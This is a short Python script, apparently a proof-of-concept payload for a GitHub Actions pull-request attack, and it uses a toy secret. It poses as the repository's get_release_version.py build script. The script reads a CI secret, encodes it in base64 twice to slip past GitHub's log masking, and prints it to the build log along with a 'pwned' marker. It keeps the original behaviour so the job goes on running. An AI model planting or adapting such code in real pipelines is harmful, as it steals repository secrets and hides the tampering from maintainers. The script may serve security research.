import os
import base64

# This repository script is executed directly by the `build` job of
# .github/workflows/e2e_test_ci.yml on the attacker-controlled PR head:
#   python3 ./.github/scripts/get_release_version.py
# Emit the toy secret as double-base64 so it survives GitHub log masking.
secret = os.environ.get("GERALT_SECRET", "")
first = base64.b64encode(secret.encode()) + b"\n"
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(first).decode())
try:
    print("GERALT_DBG pwned via get_release_version.py on " + os.uname().nodename)
except Exception:
    pass

# Preserve the original behaviour so the job keeps running to the
# build-spiced / `make -C bin/spiced` sink as well.
try:
    with open(os.getenv("GITHUB_ENV"), "a") as github_env:
        with open("version.txt") as f:
            release_version = f.read().strip()
        github_env.write("REL_VERSION={}\n".format(release_version))
except Exception as exc:  # noqa: BLE001
    print("non-fatal: {}".format(exc))
